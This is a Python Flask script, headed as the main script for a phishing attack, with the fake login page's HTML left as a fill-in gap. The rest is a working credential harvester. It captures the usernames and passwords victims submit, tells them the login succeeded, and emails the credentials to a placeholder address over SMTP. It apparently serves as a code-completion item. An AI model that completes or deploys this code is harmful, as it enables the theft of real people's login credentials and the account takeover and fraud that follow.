# Main script to start the phishing attack

import flask
from flask import Flask, request, render_template_string
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

app = Flask(__name__)

# Route to serve the phishing page
@app.route('/')
def phishing_page():
    # HTML content for the phishing page
    <FILL_HERE>
# Route to handle form submission
@app.route('/submit', methods=['POST'])
def submit():
    username = request.form['username']
    password = request.form['password']
    # Send captured credentials via email
    send_email(username, password)
    return "Login successful!"

# Function to send captured credentials via email
def send_email(username, password):
    sender_email = "your_email@example.com"
    receiver_email = "your_email@example.com"
    subject = "Phishing Attack Results"
    body = f"Username: {username}\nPassword: {password}"

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    try:
        server = smtplib.SMTP('smtp.example.com', 587)
        server.starttls()
        server.login(sender_email, "your_email_password")
        text = msg.as_string()
        server.sendmail(sender_email, receiver_email, text)
        server.quit()
    except Exception as e:
        print(f"Failed to send email: {e}")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)